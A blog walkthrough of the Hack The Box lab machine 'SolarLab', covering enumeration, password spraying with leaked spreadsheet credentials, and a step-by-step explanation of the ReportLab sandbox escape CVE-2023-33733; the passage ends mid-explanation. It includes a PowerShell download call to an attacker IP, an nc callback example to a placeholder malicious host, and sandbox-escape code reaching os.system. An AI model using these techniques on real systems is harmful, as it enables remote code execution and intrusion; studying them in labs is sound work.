+++
tags = ["Box", "HTB", "Medium", "Windows", "Python", "openfire", "ReportLab", "CVE-2023-33733", "CVE-2023-32315", "java", "jsp"]
draft = false
title = "SolarLab HTB Walkthrough"
author = "bloodstiller"
date = 2025-04-22
toc = true
bold = true
next = true
+++

## SolarLab Hack The Box Walkthrough/Writeup: {#solarlab-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/SolarLab>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands we are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling we this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if we see me using that path that's why. If we are on Kali and following on, we will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    ```shell
    #Command
    nmap $box -Pn -oA TCPbasicScan

    #Results
    kali in Boxes/BlogEntriesMade/SolarLab/scans/nmap  🍣 main 📝 ×219 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 06:48:30 zsh ❯ nmap $box -Pn -oA TCPbasicScan
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 06:48 BST
    Nmap scan report for 10.129.231.39
    Host is up (0.027s latency).
    Not shown: 996 filtered tcp ports (no-response)
    PORT    STATE SERVICE
    80/tcp  open  http
    135/tcp open  msrpc
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds

    Nmap done: 1 IP address (1 host up) scanned in 4.27 seconds

    ```

    -   **Initial thoughts**:
        -   Pretty minimal services running so far
            -   SMB, Web &amp; RPC.


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:
    ```shell
    #Command
    sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP

    #Results
    kali in Boxes/BlogEntriesMade/SolarLab/scans/nmap  🍣 main 📝 ×219 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 06:48:55 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    [sudo] password for kali:
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 06:49 BST
    Nmap scan report for 10.129.231.39
    Host is up (0.029s latency).
    Not shown: 65530 filtered tcp ports (no-response)
    PORT     STATE SERVICE       VERSION
    80/tcp   open  http          nginx 1.24.0
    |_http-title: Did not follow redirect to http://solarlab.htb/
    |_http-server-header: nginx/1.24.0
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    445/tcp  open  microsoft-ds?
    6791/tcp open  http          nginx 1.24.0
    |_http-server-header: nginx/1.24.0
    |_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
    OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
    Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time:
    |   date: 2025-04-13T05:52:10
    |_  start_date: N/A
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled but not required

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 169.05 seconds

    ```

    -   **Findings**:
        -   This is very interesting as we can see that there is an `nginx` webserver running on port `6791` and that it redirects to  <http://report.solarlab.htb:6791/> which means we should update our `/etc/hosts` file to reflect this so it resolves correctly.
            -   {{< figure src="/ox-hugo/2025-04-13-075553_.png" >}}


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

**This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:

```shell
netexec smb $box -u 'guest' -p '' --shares

netexec smb $box -u '' -p '' --shares
```

As we can see we can authenticate using the `guest` account and access the `Documents` &amp; `IP$` share. We can also see that null sessions have been disables.

-   {{< figure src="/ox-hugo/2025-04-13-065216_.png" >}}
-   +Note+: We can see the build number is `19041` We can now enumerate that.


#### Enumerating Users with Impacket-lookupsid: {#enumerating-users-with-impacket-lookupsid}

As RPC is running I try and run `impacket-lookupsid` to dump any usernames however it doesn't seem to work so will need to come back to this.

```shell
impacket-lookupsid guest@$box -domain-sids -no-pass
```

-   {{< figure src="/ox-hugo/2025-04-13-070509_.png" >}}
-   +Note+:
    -   As we are using the "Guest" account we can just hit enter for a blank password
    -   I also try and use `netexec` but no dice.


#### Using smbclient: {#using-smbclient}

We can connect to the share using `smbclient`

```shell
smbclient -U 'guest' "\\\\$box\\[Share]"
```

-   {{< figure src="/ox-hugo/2025-04-13-065453_.png" >}}

We can see there are some interesting files here already. To expedite this process I am going to download the entire smb share with. To do this with `smbclient` all we have to do is enter the following commands


##### Easy way to download all contents of a share using `smbclient`: {#easy-way-to-download-all-contents-of-a-share-using-smbclient}

1.  Connect to the client as normal:
2.  Run the following commands from within the SMB shell.
    ```shell
    RECURSE ON
    PROMPT OFF
    mget *
    ```

    -   {{< figure src="/ox-hugo/2025-04-13-070250_.png" >}}


#### Discovering Clear Text Passwords in `details-file.xlsx` from SMB Share: {#discovering-clear-text-passwords-in-details-file-dot-xlsx-from-smb-share}

Looking through the files in the smb share. I find a whole spreadsheet of clear text passwords called `details-file.xlsx` I add these to my email, username &amp; password lists.

-   {{< figure src="/ox-hugo/2025-04-13-071402_.png" >}}
-   +Important+:
    -   I also add the security question answers to the password lists, as these could also be used as passwords.
    -   I add just the first name and last name to the users list too, e.g "alexander.knight@gmail.com" also gets the following entries:
        -   alexander
        -   knight
        -   alexander.knight


##### Additional SMB Findings: {#additional-smb-findings}

-   I find the email `skillspool@woodgroup.com` in the training request form and add to the email list.


### Finding Valid Creds By Password Spraying: {#finding-valid-creds-by-password-spraying}

Now that we have the passwords and usersnames we can cred stuff using `netexec`

```shell
netexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep [+]
```

We get a hit for `blake` and one of the found passwords

-   {{< figure src="/ox-hugo/2025-04-13-073814_.png" >}}


#### But what are all the `guest` responses for invalid user password combinations bloodstiller? {#but-what-are-all-the-guest-responses-for-invalid-user-password-combinations-bloodstiller}

Fantastic question and here is why (according to the netexec) wiki.

> Using a random username and password we can check if the target accepts guest logon. If so, it means that either the domain guest account or the local guest account of the server we're targetting is enabled.

-   <https://www.netexec.wiki/smb-protocol/enumeration/enumerate-guest-logon>

Basically, we could put in any random username and text and if we got the `Guest` response it would tell us the guest account is enabled.


### Accessing the Host As Blake: {#accessing-the-host-as-blake}

First lets store our username &amp; creds in variables to make things a little easier.

```shell
user='blake'
pass='ThisCanB3typedeasily1@'
```

-   {{< figure src="/ox-hugo/2025-04-13-074411_.png" >}}

I re-access the Share to see if I can get any further access this way but I cannot.


### Web `80`: {#web-80}

-   **Web Enumeration via Burp Suite**:
    -   When enumerating a Website, always use Burp Suite. This allows we to:
    -   Record all potential injection points.
    -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track wer testing progress.


#### Running WhatWeb: {#running-whatweb}


##### Against the Base Url/IP: {#against-the-base-url-ip}

-   Lets run "whatWeb" to see if I can glean some further information:
    ```shell
    #Command
    whatweb http://$box | sed 's/, /\n/g'

    #Output
    kali in Walkthroughs/HTB/Boxes/BlogEntriesMade/SolarLab  🍣 main 📝 ×219 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh  took 18s
    🕙 07:56:07 zsh ❯ whatweb http://$box | sed 's/, /\n/g'
    http://10.129.231.39 [301 Moved Permanently] Country[RESERVED][ZZ]
    HTTPServer[nginx/1.24.0]
    IP[10.129.231.39]
    RedirectLocation[http://solarlab.htb/]
    Title[301 Moved Permanently]
    nginx[1.24.0]
    http://solarlab.htb/ [200 OK] Bootstrap
    Country[RESERVED][ZZ]
    HTML5
    HTTPServer[nginx/1.24.0]
    IP[10.129.231.39]
    JQuery[2.1.0]
    Meta-Author[Jewel Theme]
    Modernizr[2.8.0.min]
    Script[text/javascript]
    Title[SolarLab Instant Messenger]
    X-UA-Compatible[IE=edge]
    nginx[1.24.0]

    ```

    -   **Results**:
        -   Appears the site is for an Instant Messenger app.
        -   **Running**
            -   jquery `2.1.0`
            -   nginx `1.24.0`
    -   +Note+: I use sed to put the output across multiple lines for a nicer output.


##### Against `report.solarlab.htb:6791`: {#against-report-dot-solarlab-dot-htb-6791}

```shell
#Command
whatweb http://report.solarlab.htb:6791 | sed 's/, /\n/g'

#Results
kali in Walkthroughs/HTB/Boxes/BlogEntriesMade/SolarLab  🍣 main 📝 ×219 3GiB/7GiB | 12kiB/1GiB with /usr/bin/zsh
🕙 08:01:36 zsh ❯ whatweb http://report.solarlab.htb:6791 | sed 's/, /\n/g'
http://report.solarlab.htb:6791 [200 OK] Country[RESERVED][ZZ]
HTML5
HTTPServer[nginx/1.24.0]
IP[10.129.231.39]
PasswordField[password]
Title[Login - ReportHub]
nginx[1.24.0]
```

-   **Results**:
    -   As we can see there is a password field and this a Login page
    -   **Running**:
        -   reporthub


#### Visiting the web page `solarlab.htb`: {#visiting-the-web-page-solarlab-dot-htb}

Looking at the page it's a single page website with some injection points:

-   Potential Injection point 1:
    -   {{< figure src="/ox-hugo/2025-04-13-081144_.png" >}}
    -   I try and run a simple injection while proxying through burpsuite but do not get anything.

-   Potential Injection point 2:
    -   {{< figure src="/ox-hugo/2025-04-13-081213_.png" >}}
    -   I try and run a simple injection while proxying through burpsuite but do not get anything.

We can also see it's the running `kite` when I click it it directs me to a 404, but I can see on the page the name is for `jeweltheme` which is also mentioned and they do `wordpress` themes. I check if it's running wordpress using `wpscan` which say's it's not.

-   {{< figure src="/ox-hugo/2025-04-13-083113_.png" >}}

I check the repo for the jeweltheme and there is no additional information other than letting us know it's a coming soon page.

-   <https://github.com/jeweltheme/kite-coming-soon-template?tab=readme-ov-file>


#### Visiting the web page `report.solarlab.htb:6791/login`: {#visiting-the-web-page-report-dot-solarlab-dot-htb-6791-login}

Visiting the page we can see it's a login page, as expected, for ReportHub.

-   {{< figure src="/ox-hugo/2025-04-13-080821_.png" >}}

Looking online it appears ReportHub is risk management software.


#### Dirbusting The Webserver Running Using ferox: {#dirbusting-the-webserver-running-using-ferox}


##### On base web page: {#on-base-web-page}

I Perform some directory busting to see if there are any interesting directories:

-   First against the base webserver running `80`
    ```shell
    #Command
    feroxbuster -u http://$box:80 --threads 20 --scan-limit 2 -q -r -o $domain-FeroxScan.txt
    ```

    -   There is nothing of note.
    -   **Some notes on my flags**:
        -   `--threads 20 --scan-limit 2` I limit the threads &amp; scan limit as otherwise it effectively DDOS’ the site.
        -   `-q` As I run tmux for most sessions, this quiet flag removes the progress bar and is advised when using tmux etc.
        -   `-r` Follows redirects.
        -   `-o $domain-FeroxScan.txt` sometimes there can be ALOT of output so this makes it more manageable to go through later.


##### On <http://report.solarlab.htb:6791/> {#on-http-report-dot-solarlab-dot-htb-6791}

```shell
#Command
feroxbuster -u http://report.solarlab.htb:6791 --threads 20 --scan-limit 2 -q -r -o $domain-FeroxScan.txt
```

Nothing of note, I actually re-run using ffuf and get a few standard endpoints:

```shell
ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://report.$domain:6791/FUZZ -fc 403 -ic
```

-   {{< figure src="/ox-hugo/2025-04-13-093345_.png" >}}


### Web `6791` {#web-6791}


### Enumerating Users As Blake: {#enumerating-users-as-blake}

I have been stuck for a little while on this, initially I tried to enumerate users as blake using the standard way like the below however this did not work.

```shell
kali in HTB/Boxes/BlogEntriesMade/SolarLab/scans  🍣 main 📝 ×219 4GiB/7GiB | 2MiB/1GiB with /usr/bin/zsh
🕙 09:15:52 zsh ❯ netexec smb $box -u $user -p $pass --users
SMB         10.129.231.39   445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.129.231.39   445    SOLARLAB         [+] solarlab\blake:ThisCanB3typedeasily1@
SMB         10.129.231.39   445    SOLARLAB         [-] Account not found in the BloodHound database.
```

However we can also bruteforce the RID's using netexec/crackmap's built in `--rid-brute` module and I found another users, `openfire`, I add this to my list of users.

```shell
netexec smb $box -u $user -p $pass --rid-brute
```

-   {{< figure src="/ox-hugo/2025-04-13-091924_.png" >}}


### Discovering the `openfire` user is locked out: {#discovering-the-openfire-user-is-locked-out}

I try some cred stuffing with the "openfire" user but discover they are locked out.

-   {{< figure src="/ox-hugo/2025-04-13-092227_.png" >}}


### Updating Our User's List: {#updating-our-user-s-list}

So I got stumped here for a while and started looking at everything again. I fuzzed for subdomains, looked for default creds for the "ReportHub" software, analyzed static code on the website and after a while I noticed all the users on the main page have what appears to have normal names apart from "blake" his is listed as "Blake Byte", it's a cool last name but I doubt a real one.

-   {{< figure src="/ox-hugo/2025-04-13-160021_.png" >}}

Looking at the `details-file.xlsx` file again, we can see the answer Blake's security question "What is wer mother's maiden name?" is "Helena"

-   {{< figure src="/ox-hugo/2025-04-13-160635_.png" >}}

I add the following entries to my username list, however these also give me no hits.

```txt
blake.helena
helena
```

Looking at the other users names we can see that they following the convention(s) of

-   lastnamefirstinitial:firstname e.g. "KAlexander"
-   firstname:firstinitialoflastname e.g "AlexanderK" &amp; "ClaudiaS"

I add the following entries to my username list, ensuring to cover Blake's listed name as well as mothers maiden name.

```txt
BByte
HByte
BlakeH
BlakeB
```


### Information Disclosure Vulnerability: {#information-disclosure-vulnerability}

I run my attack in burpsuite again and this time I get a different error, for the username "BlakeB" I get the response "User authentication error"

-   {{< figure src="/ox-hugo/2025-04-13-162216_.png" >}}

**"But bloodstiller why is that important?"** great question.
If we look at another response from this attack we can see two things, first it's a different size (this is due to the response message) and also the error message is "User not found."

-   {{< figure src="/ox-hugo/2025-04-13-162616_.png" >}}

**"But what does that tell us?"**

When we receive "User authentication error" for the username "BlakeB", it confirms this username exists in the system but our password attempt was incorrect. In contrast, when we receive "User not found" for other usernames, the system is telling us these accounts don't exist at all.

This is actually classed as an "information disclosure vulnerability" as it allows us to enumerate valid usernames based on the different responses which we can then focus on password attacks for. This is exactly why security best practices recommend using generic error messages like "Invalid username or password" that don't reveal whether the username exists or the password is incorrect.


## 2. Foothold: {#2-dot-foothold}


### Finding blakes login password for reporthub after making a mistake: {#finding-blakes-login-password-for-reporthub-after-making-a-mistake}

So after some more fuzzing and password spraying I had realized, I had the Payload Encoding option turned on in burpsuite.

-   {{< figure src="/ox-hugo/2025-04-13-164616_.png" >}}

After turning this off, it turned out I had blakeb's password all along.

-   {{< figure src="/ox-hugo/2025-04-13-164524_.png" >}}
    -   `blakeb:ThisCanB3typedeasily1@`


### Logging into ReportHub as Blake: {#logging-into-reporthub-as-blake}

Logging into ReportHub we are given 4 different options:

-   {{< figure src="/ox-hugo/2025-04-14-062526_.png" >}}

Clicking into each option provides what appears to be the same page.

-   {{< figure src="/ox-hugo/2025-04-14-062741_.png" >}}

We can enter dates, contact number, a message &amp; then the ability to upload a signature &amp; then generate a pdf.

The first thing that strikes me is that the justification box has the ability to enter code, this coupled with the fact that the contents of the justification box has to be processed when generating a PDF leads me to believe we could potentially get code execution this way.


### Trying to get RCE in ReportHub: {#trying-to-get-rce-in-reporthub}

I create a code box in the pdf generator and enter the below. I also start a python web server.

```powershell
powershell -Command "(new-object net.webclient).DownloadString('http://10.10.14.20:9000/test')"
```

-   {{< figure src="/ox-hugo/2025-04-14-063221_.png" >}}

When I click to generate the pdf it forces me to upload a signature, I upload a cat picture and generate it and are provided the below.

-   {{< figure src="/ox-hugo/2025-04-14-063621_.png" >}}


### Discovering ReportLab is being used: {#discovering-reportlab-is-being-used}

Running `exiftool` on the downloaded pdf shows us that it's using the ReportLab PDF library

```shell
exiftool output.pdf
```

-   {{< figure src="/ox-hugo/2025-04-17-080042_.png" >}}

Some quick searching online reveals some CVE's namely [CVE-2023-33733](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33733)


### CVE-2023-33733 Breakdown: {#cve-2023-33733-breakdown}

Buckle up as we are going into great detail as to why this exploit works and the mechanisms around it, I would urge you to read the below links as well to really understand what is happening under the hood here as it will greatly increase your understanding. However if you just want to skip to the end and run the exploit by all means do, but if you do not understand why this works you are doing yourself a disservice.

Some recommended reading:

-   <https://socradar.io/cve-2023-33733-vulnerability-in-reportlab-allows-bypassing-sandbox-restrictions/>
-   <https://github.com/c53elyas/CVE-2023-33733>

This took me a long while to understand this so I a have tried to explain it as simply as I can below for others to understand.

+Important+:

-   I also want to be VERY clear, I am just explaining the great work done by c53elyas I lay no claim to it myself, this is just a means to understand the work.
-   If there is anything wrong please do send me an email to correct me bloodstiller@bloodstiller.com


#### The Vulnerability: Unsafe "eval" {#the-vulnerability-unsafe-eval}


##### eval Primer: {#eval-primer}

First of all, what is `eval()` and what does it do?

`eval()` takes text and runs it as Python code.

Here is a simple Example:

```python
eval("2 + 2")
# Runs this as code, gives 4

eval("print ('hello world')")
# Run this and it will print hello world
```

Bad guys love `eval()` because it allows the running of os level commands like the below by using the `os` module

```python
eval("__import__('os').system('calc.exe')")
# This will open Calculator on Windows!

eval("__import__('os').system('/usr/bin/firefox -browser http://google.com')")
#This will open firefox and open google.com

eval("__import__('os').system('/bin/nc http://[maliciousHost]:[Port]')")
#This could be used to launch nc and connect back to a malcious endpoint
```

<!--list-separator-->

-  The issue:

    -   What did Report-Lab do wrong?? (nothing, they did their best and attackers are sneaky however here is a wide overview)
    -   They let people give input (this is fine as people need to use the software)
        -   That input got passed to `eval()` without sanitization &amp; this led to RCE [CVE-2019-17626](https://www.cve.org/CVERecord?id=CVE-2019-17626)

<!--list-separator-->

-  The solution: They tried to make it safe with "safe eval" `(rl_safe_eval)` by creating sandbox when they patched it.

    -   This sandbox blocked dangerous functionality like: `open, exec, eval`, etc.
    -   It also blocked secret attributes like `__globals__, ___class___, __code__`.
    -   They made a safer version of `getattr()` and `type()`.

    But the problem is: Python is tricky. Even with some protections, smart attackers can still "sneak" dangerous stuff back!


#### The Exploit Idea: Escape the created sandbox: {#the-exploit-idea-escape-the-created-sandbox}

-   The goal:
    -   Get back the original Python tools that can run system commands e.g. `eval`, `exec`, `open`

-   Step by step High Level:
    -   Sneak around the sandbox restrictions.
    -   Find the hidden way to access dangerous stuff like `os.system`.
    -   Run any command


#### Step 1: Get back the real `type()` function {#step-1-get-back-the-real-type-function}

What is `type` I hear you ask? In Python, `type()` is an inbuilt function that does two things.

1.  It enables us to query what class an object is, this is done by passing it a single argument like below.
    ```python
    >>> type(1)
    <class 'int'>

    >>> type("s")
    <class 'str'>

    >>> type(1.4)
    <class 'float'>

    >>> type(eval)
    <class 'builtin_function_or_method'>

    >>> type(False)
    <class 'bool'>

    >>> type(True)
    <class 'bool'>
    ```

2.  It enables us to create objects/classes dynamically on the fly by passing it 3 arguments.
    ```python
    # Define a simple method for our class
    def say_hello(self, name):
        return f"Hello, {name}!"

    # Create a class using type()
    SimpleGreeter = type(
        "SimpleGreeter",      # Class name
        (object,),            # Base classes (tuple)
        {                     # Class attributes and methods dictionary
            "greeting": "Hello",
            "say_hello": say_hello
        }
    )

    # Use the dynamically created class
    if __name__ == "__main__":
        # Create an instance
        greeter = SimpleGreeter()

        # Access the class attribute
        print(f"Default greeting: {greeter.greeting}")

        # Call the method
        message = greeter.say_hello("Alice")
        print(message)  # Output: Hello, Alice!

        # Verify it's the class we created
        print(f"Class name: {greeter.__class__.__name__}")

    ```

If you want you can just paste the above as a code block into a python shell to watch it execute.

-   {{< figure src="/ox-hugo/2025-04-16-111600_.png" >}}

So why am I explaining this all, well if we can access `type()` and pass it 3 arguments we can create classes on the fly to access functionality we should not be able to access in the restricted environment.


#### Escaping Sand-boxed `type()` function: {#escaping-sand-boxed-type-function}

In the sandbox, a fake `type()` class (below) is used,to prevent us being able to use the original in-built version of `type()`.

```python
def __rl_type__(self, *args):
    if len(args) == 1: return type(*args)
    raise BadCode('type call error')
```

In this restricted version of type only one argument can be passed, and if more than one argument is passed it will return `BadCode 'type call error'` which means it cannot be used to create classes&#x2026;..or can it.


#### Using the restricted `type()` to access original `type()`: {#using-the-restricted-type-to-access-original-type}

So here is the amazing workaround [c53elyas](https://github.com/c53elyas/CVE-2023-33733) found! We can use the fake `type` to recover the original real `type` by using the below line.

```python
type(type(1))
# This resturns the original <class 'type'>
```

**Step by step of why this is so clever &amp; how it works**:

1.  `type(1)` -&gt; Python checks: "what is 1?"
    -   Result: `<class 'int'>` as 1 is an integer.

2.  `type(<class 'int'>`) -&gt; Python checks: "what is the class of `<class 'int'>`?"
    -   Result: `<class 'type'>` as `int` is a type in python!

Which means `type(type(1))` gives us the real, original Python type class! So if we can call it, it means we can also store it in a variable like below. So when we call `orgTypeFun` we are calling `type()`

```python
orgTypeFun = type(type(1))
```

So this means, if we can call the original `type()` class we can now use it to create new classes objects dynamically!

```python
Word = orgTypeFun('Word', (str,), {...})
```

In the simple terms:

-   We used their limited tool to grab the real tool hidden inside Python itself!

Simple Diagram explaining the process for those learn better visually

```python
[ sandboxed type() ]
        |
        v
  type(1) ————> <class 'int'>
        |
        v
 type(<class 'int'>) ———> <class 'type'> ✅ (The real deal!)

Result:
orgTypeFun = type(type(1))
Now we have the true 'type', free from sandbox limits!
```


#### Step 2: Make a fake class (called Word) to trick checks: {#step-2-make-a-fake-class--called-word--to-trick-checks}

The sandboxed version of `eval()` in ReportLab tries to block access to dangerous attributes like `__globals__, __code__`, etc.

So whenever we try to use `getattr(obj, name)`, it checks:

```python
if name.startswith('__'):
    raise BadCode("Unsafe access")
```

This is intended to stop us from doing something like:

```python
getattr(func, '__globals__')  # gives access to the global scope

```

So we need a way to trick this check.


##### Side Quest: What does `func.__globals__` do &amp; why is it dangerous? {#side-quest-what-does-func-dot-globals-do-and-why-is-it-dangerous}

In Python, functions have an attribute called `__globals__` that points to the global namespace (i.e., the dictionary of all variables available when the function was defined).

```python
def my_func():
    return 42

print(my_func.__globals__)
```

This prints a dictionary — like:

```python
{
  '__name__': '__main__',
  '__doc__': None,
  'os': <module 'os' from '...'>,
  'open': <built-in function open>,
  'eval': <built-in function eval>,
  ...
}
```

That means, from any function, you can access everything in the global scope, including modules like `os`, and dangerous built-ins like `eval`, `open`, `exec`, etc.

<!--list-separator-->

-  Why is that dangerous?

    Let’s say we’re inside a sandboxed `eval()` environment where built-ins like `open`, `os.system`, etc., are removed.

    But if you can do:

    ```python
    getattr(safe_function, '__globals__')
    ```

    &#x2026;you can break out of that sandbox, because now you have:

    ```python
    glbs = getattr(safe_function, '__globals__')

    # Windows
    glbs['os'].system('calc.exe')  # on Windows
    # Nix
    glbs['eval']('open("secret.txt").read()')
    ```

<!--list-separator-->

-  Why the sandbox blocks it:

    The sandbox tries to prevent this by blocking any attribute access like `__globals__` or `__code__`, because:

    -   `__globals__` → gives access to all variables and modules.
    -   `__code__` → lets you inspect or even modify function internals.
    -   `__class__` → can give access to dangerous metaprogramming tools.

    If we bypass those restrictions using the fake Word class (see below), we can call:

    ```python
    getattr(pow, Word('__globals__'))['os'].system('calc.exe')
    ```

    Even though '`__globals__`' is blocked in the sandbox, it gets sneaked in using a fake object that tricks the checks.


#### The Trick: A Fake String Class: {#the-trick-a-fake-string-class}

In Python, we can subclass built-in types like `str` and override their methods. That includes `startswith()`, `__eq__`, and `__hash__`.

We can use this power to create a custom string-like object that lies about itself in order to pass the sandbox checks.


##### How the Sandbox Works: {#how-the-sandbox-works}

So we can understand the exploit we let’s look at this method that checks names in the safe eval system.

```python
def __rl_is_allowed_name__(self, name):
    if name in __rl_unsafe__ or (name.startswith('__') and name != '__'):
        raise BadCode("Unsafe access of %s" % name)
```

-   This function does two things:
    1.  Checks if the name is in a list of known unsafe names (`__rl_unsafe__`).

    2.  Checks if the name starts with double underscores (`__`) but isn’t just '`__`'.

The key here is that **both of these checks rely on the string’s methods** — and we can override them.


#### Creating The Custom String Class: {#creating-the-custom-string-class}

Here’s the class the we can build, using the recovered `type()` to trick the sandbox:

```python
# Recover true type to enable us to create a class
orgTypeFun = type(type(1))

# Call recovered type to create a class
Word = orgTypeFun('Word', (str,), {
    'mutated': 1,
    'startswith': lambda self, x: False,
    '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x,
    'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)},
    '__hash__': lambda self: hash(str(self)),
})
```


##### Let’s break this down: {#let-s-break-this-down}

1.  Create the new class:
    ```python
    Word = orgTypeFun('Word', (str,), { ... })
    ```

This is creating a new class called `Word`, that inherits from `str,` using the recovered original `type()` function.

The `str` inheritance means the object behaves mostly like a normal string, but we’re overriding key behaviors.


##### What’s Overridden and Why: {#what-s-overridden-and-why}

We are going to leave this int here at the moment as it will come into play a bit later on and make more sense, however just know that we create an object called `mutated` which has the int value of `1`

```python
'mutated': 1,
```

<!--list-separator-->

-  1. `startswith`: Bypassing the `__` check

    We want to bypass the `(name.startswith('__')` check that happens in the sandbox, we do this with the following lines.

    ```python
    'startswith': lambda self, x: False,
    ```

    This line is defining a method named `startswith` for a class, and it's using a lambda function **that always returns** `False` regardless of the input.

    Breaking it down:

    '`startswith`' is the name of the method being defined
    `lambda self, x: False` is a function that takes two parameters (`self` and `x`) but ignores them completely and always returns `False`

    This means that for any instance of this class, when you call the `startswith()` method with any argument, it will always return `False`.

    Meaning we can call "`__globals__`", and this method returns `False` resulting in it bypassing the sandbox check

<!--list-separator-->

-  2. `__eq__`: Tricking exact string comparison:

    The sandbox also checks the following:

    ```python
    if name in __rl_unsafe__:
    ```

    To pass this check, the string should not match known bad strings like '`__globals__`'.

    Python does this check by calling `__eq__` for comparisons but remember we are using a custom subclass of `str`, so with the below we are overriding the built in functionality of `__eq__`.

    So, we override `__eq__` with the following code.

    ```python
    'mutated':1,
    '__eq__'    : lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x,
    'mutate'    : lambda self: {setattr(self, 'mutated', self.mutated - 1)
    ```

    We need to know what `mutate` does before this will make sense so let me explain that:

    ```python
    'mutate'    : lambda self: {setattr(self, 'mutated', self.mutated - 1)
    ```

    -   It decrements the `mutated` attribute by `1` using `setattr`, remember at the start of this I showed how we created an object called `mutated` with a value of `1`? Well in simple terms it takes the `mutated` value which we set as `1` at the start and deducts `1`, this may sound weird but will make more sense soon.

    ---

    Back to the `__eq__` method:

    The `__eq__` method does three things, in order:

    1.  `self.mutate()`
        -   → Calls the `muteate` method that subtracts 1 from `mutated` via `self.mutated`. So `self.mutated` becomes `0`, then on the next cycle it becomes `-1`, and so on.

    2.  `self.mutated < 0`
        -   → It then checks if `self.mutated` is greater than `0`. Which will return `False` the first time (when `mutated == 0`), but `True` later (when `mutated < 0`).

    3.  `str(self) == x`
        -   → Only checked if the previous two conditions pass.

    So when the sandbox checks:

    ```python
    if name == '__globals__':
    ```

    -   First time it runs, when the sandbox checks if it's dangerous:
        -   `self.mutated = 1`
        -   `self.mutate()` makes it `0`
        -   `self.mutated < 0` is `False`

    ✔ So the whole thing is `False` which lets us bypass the check so `__if name == '__globals__'` returns `False`

    -   Next time it runs for `getattr()`
        -   `self.mutated = 0`
        -   `self.mutate()` makes it `-1`
        -   `self.mutated < 0` is now `True`
        -   If the actual string is "`__globals__`", then `str(self) == x` is also `True`

    ✔ Now `__eq__` returns `True`

    ✔ So we can access `__globals__` successfully

    So the object acts safe at first by returning `False`, then dangerous when needed by returning `True`.

<!--list-separator-->

-  3. `__hash__`: Required for dictionary lookups

    The sandbox might put strings into sets or dicts, so the object needs to be hashable.

    This returns the hash of the real string, that's all.

    ```python
    '__hash__': lambda self: hash(str(self))
    ```

    It ensures it can be used in any place that expects a regular string.


##### Result of the above: {#result-of-the-above}

When this fake `Word('___globals___')` object is passed to `getattr`, it:

-   Bypasses `startswith('__')` check as this always returns `False`.
-   Avoids matching bad strings at the right time returns `False` again
-   Acts like a real string when the actual Python interpreter uses it, returns `True` when needed.


#### Step 3: Access the globals: {#step-3-access-the-globals}

In Python, every function remembers where it came from using `__globals__`, (remember I said this above.) Well inside the sandbox, "safe" functions like `pow()` still remember their `__globals__` which means we can use our Word class (which has all the sneaky bypasses) to access these `__globals__` and in turn call these functions that are inherently part of them.

We use our Word class to ask:

```python
globalsattr = Word('__globals__')
glbs = getattr(pow, globalsattr)
```

Now we have the sandbox’s globals! We can do the following.

```python
glbs['os'].system('calc.exe')  # 🎉 Calculator opens!
```


#### Step 4: Put it all in one line: {#step-4-put-it-all-in-one-line}

So now we have all the relevant parts of the bypass made.
However, the sandbox only allows single-line expressions, so we can’t write normal multi-line Python code.

To get around this, we use a list comprehension, which lets us run multiple things inside a single line.

One odd thing to note: with list comprehensions like:

```python
[print(x) for x in ['Hello']]
```

